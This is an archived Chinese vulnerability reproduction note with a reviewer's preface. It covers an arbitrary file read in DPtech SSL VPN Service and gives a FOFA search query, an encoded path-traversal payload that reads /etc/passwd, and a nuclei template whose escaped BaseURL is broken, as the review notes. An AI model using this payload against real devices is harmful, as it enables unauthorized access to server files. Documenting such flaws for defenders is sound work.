---
source: "MrWQ/vulnerability-paper"
id: "vw-d17f51f032c70dcb5f96c218"
entity_id: "ve-d17f51f032c70dcb5f96c218"
schema_version: "1"
fofa_unverified: "搜索语句"
title: "【1day】迪普 VPN Service 任意文件读取漏洞复现（附 nuclei poc）"
product: "DPtech SSL VPN Service"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无具体固件/认证说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E8%BF%AA%E6%99%AE/1day%20%E8%BF%AA%E6%99%AE%20VPN%20Service%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E9%99%84%20nuclei%20poc%EF%BC%89.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/L2Xe6VO80NOQSQv9txc0_Q"
source_status: "recorded"
---

# 【1day】迪普 VPN Service 任意文件读取漏洞复现（附 nuclei poc）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：DPtech SSL VPN Service
- 本文讨论：编码斜杠目录穿越
- 版本、权限与配置前提：无具体固件/认证说明
- 资料类型：路径读取复现与Nuclei模板；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- YAML双引号路径写\{\{BaseURL\}\}，非法转义且模板变量损坏
- fofa错抽搜索语句；verified:true只是作者标记不能作本审计验证
- 无固定版本/厂商公告，通用修复不够可操作
- 历史校订意见（原始示例按归档保留，下述改写不再应用于原始示例）：“\{”改为“{”；“\}”改为“}”；残缺指纹退出可执行索引并保留原值。以上意见置于原始示例之外，不覆盖原文证据；未做运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 原漏洞版本/修复及响应范围待确认
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/L2Xe6VO80NOQSQv9txc0_Q)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

01

—

漏洞名称

迪普 VPN Service 任意文件读取漏洞

02

—  

漏洞影响

DPtech-SSL-VPN  

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMaUuvQibAF4BnZvtkz9wMCKXdicYIQLOoTu2jldYo3J1Z9qfroNFgCyfPNpDBKzNUqZYqe1ZP0Ljvg/640?wx_fmt=png&from=appmsg)

03

—  

漏洞描述

杭州迪普科技股份有限公司 DPTech VPN Service 存在任意文件读取漏洞，攻击者可以构造恶意请求，通过漏洞读取服务器上的任意文件。

04

—  

FOFA 搜索语句

  

```
app="DPtech-SSLVPN"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMaUuvQibAF4BnZvtkz9wMCKWsZ29wBibiaTlnVQsHfFBiau4CTg65AG80DfFZicqqHJdLt3mTkDD27VRA/640?wx_fmt=png&from=appmsg)

05

—  

漏洞复现

POC 如下

```
/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

```

使用浏览器访问

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMaUuvQibAF4BnZvtkz9wMCKSMJGfUZCKkL9niczjgZyMUibbPFaVrqcvDjEicgCuOIyicYXEBTFEmW47Q/640?wx_fmt=png&from=appmsg)

证明存在漏洞

06

—  

nuclei poc

poc 文件内容如下

```
id: DPtech-SSL-VPN-Service-anyfileread
info:
  name: 迪普VPN Service 接口存在任意文件读取
  author: fgz
  severity: high
  description: '杭州迪普科技股份有限公司DPTech VPN Service 存在任意文件读取漏洞，攻击者可以构造恶意请求，通过漏洞读取服务器上的任意文件。'
  tags: 2023,DPtech,anyfileread,VPN
  metadata:
    max-request: 3
    fofa-query: app="DPtech-SSLVPN"
    verified: true
http:
  - method: GET
    path:
      - "\{\{BaseURL\}\}/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*?:[0-9]*:[0-9]*:"

```

运行 POC

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMaUuvQibAF4BnZvtkz9wMCKPM5hrBCr5ribqIcjG6DXDYnTt6icwiadZPxvDZKoh1rox78E8bH0SF2RA/640?wx_fmt=png&from=appmsg)

07

—  

修复建议

升级到最新版本。

任意文件读取类漏洞通常可以如此规避：  

1.  最小权限原则： 确保应用程序或服务在运行时使用的用户或服务账户具有最小的权限。不要赋予不必要的文件读取权限给应用程序。
    
2.  输入验证和过滤： 对所有用户输入进行验证和过滤，防止恶意用户通过输入特定的数据进行文件路径遍历攻击。这通常涉及到在代码中使用合适的输入验证和过滤函数，以确保用户提供的路径不包含特殊字符或者恶意构造的数据。
    
3.  白名单： 使用白名单机制来限制可以被读取的文件或目录。确保应用程序只能访问预期的文件，并且不允许直接访问文件系统中的其他文件。
    
4.  路径规范化： 在读取文件路径之前，进行路径规范化操作，确保路径是标准化的、规范化的，并且没有使用相对路径。
    
5.  限制访问： 在服务器上通过配置文件系统权限和 Web 服务器配置来限制应用程序的访问范围。确保应用程序只能访问其需要的文件和目录。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
